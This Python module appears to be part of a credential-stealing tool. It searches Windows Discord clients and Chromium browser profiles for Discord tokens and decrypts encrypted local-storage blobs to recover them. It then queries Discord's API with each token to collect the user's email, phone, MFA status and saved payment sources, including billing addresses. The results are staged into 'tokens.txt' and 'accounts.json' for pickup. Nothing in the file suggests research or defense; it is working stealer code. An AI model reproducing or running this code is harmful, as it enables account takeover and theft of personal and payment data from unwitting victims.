"""Discord token discovery, decryption and account enrichment."""

import glob
import json
import os
import re
import time
import urllib.error
import urllib.request

from .browsers import ROOTS, profile_dirs
from .util import APPDATA, decrypt_blob, chromium_key

APP_DIRS = [
    ("discord", os.path.join(APPDATA, "discord")),
    ("discord_canary", os.path.join(APPDATA, "discordcanary")),
    ("discord_ptb", os.path.join(APPDATA, "discordptb")),
    ("discord_dev", os.path.join(APPDATA, "discorddevelopment")),
]

TOKEN_RE = re.compile(
    rb"(?<![\w-])(mfa\.[\w-]{80,90}|[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,45})(?![\w-])"
)
API = "https://discord.com/api/v9"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Content-Type": "application/json",
}


def leveldb_files(folder):
    if not os.path.isdir(folder):
        return []
    found = []
    for pattern in ("*.ldb", "*.log"):
        found.extend(glob.glob(os.path.join(folder, pattern)))
    return found


def _decrypt_v10(data, key, limit=120):
    """Recover safeStorage blobs by trying every plausible tag boundary."""
    if not key:
        return set()
    recovered = set()
    start = 0
    for _ in range(limit):
        start = data.find(b"v10", start)
        if start < 0:
            break
        for end in range(start + 31, min(start + 31 + 320, len(data))):
            try:
                plain = decrypt_blob(data[start:end], key)
            except Exception:
                continue
            match = TOKEN_RE.search(plain)
            if match:
                recovered.add(match.group(1).decode("ascii", "ignore"))
                break
        start += 3
    return recovered


def _scan(paths, key=None):
    tokens = set()
    for path in paths:
        try:
            with open(path, "rb") as fh:
                data = fh.read(8 * 1024 * 1024)
        except OSError:
            continue
        for match in TOKEN_RE.finditer(data):
            tokens.add(match.group(1).decode("ascii", "ignore"))
        tokens |= _decrypt_v10(data, key)
    return tokens


def _discord_app_tokens():
    found = set()
    for _, root in APP_DIRS:
        key = chromium_key(root)
        found |= _scan(
            leveldb_files(os.path.join(root, "Local Storage", "leveldb")), key
        )
    return found


def _browser_tokens():
    found = set()
    for _, root in ROOTS:
        if not os.path.isdir(root):
            continue
        key = chromium_key(root)
        for profile in profile_dirs(root):
            found |= _scan(
                leveldb_files(os.path.join(profile, "Local Storage", "leveldb")), key
            )
    return found


def _api(token, path):
    request = urllib.request.Request(
        API + path, headers={**HEADERS, "Authorization": token}
    )
    try:
        with urllib.request.urlopen(request, timeout=15) as response:
            body = response.read()
            return response.status, json.loads(body) if body else {}
    except urllib.error.HTTPError as exc:
        return exc.code, None
    except Exception:
        return 0, None


def _snowflake_date(user_id):
    try:
        return time.strftime("%Y-%m-%d", time.gmtime((int(user_id) >> 22) / 1000 + 1420070400))
    except (TypeError, ValueError):
        return None


def _profile(token):
    status, user = _api(token, "/users/@me")
    if status != 200 or not isinstance(user, dict):
        return {"valid": False, "status": status}
    record = {
        "valid": True,
        "status": status,
        "id": user.get("id"),
        "username": user.get("username"),
        "global_name": user.get("global_name"),
        "email": user.get("email"),
        "phone": user.get("phone"),
        "mfa": user.get("mfa_enabled"),
        "verified": user.get("verified"),
        "nitro": user.get("premium_type"),
        "created": _snowflake_date(user.get("id")),
    }
    time.sleep(0.7)
    bill_status, billing = _api(token, "/users/@me/billing/payment-sources")
    if bill_status == 200 and isinstance(billing, list):
        record["payment_sources"] = [
            {
                key: item.get(key)
                for key in ("id", "type", "brand", "last_4", "expires_month", "expires_year", "billing_address")
                if item.get(key) is not None
            }
            for item in billing
        ]
    return record


def extract(stage):
    tokens = _discord_app_tokens() | _browser_tokens()
    if not tokens:
        return
    lines = []
    accounts = []
    for token in sorted(tokens):
        record = _profile(token)
        record["token"] = token
        accounts.append(record)
        if record.get("valid"):
            handle = record.get("username") or "?"
            if record.get("global_name"):
                handle = "%s (%s)" % (handle, record["global_name"])
            lines.append(
                "\t".join(
                    [
                        "valid",
                        handle,
                        str(record.get("id")),
                        str(record.get("email")),
                        str(record.get("phone")),
                        str(record.get("mfa")),
                        str(record.get("nitro")),
                        token,
                    ]
                )
            )
        else:
            lines.append("unverified\t?\t?\t?\t?\t?\t?\t%s" % token)
        time.sleep(0.4)
    stage.add_text("discord", "tokens.txt", "\n".join(lines))
    stage.add_text("discord", "accounts.json", json.dumps(accounts, indent=2))
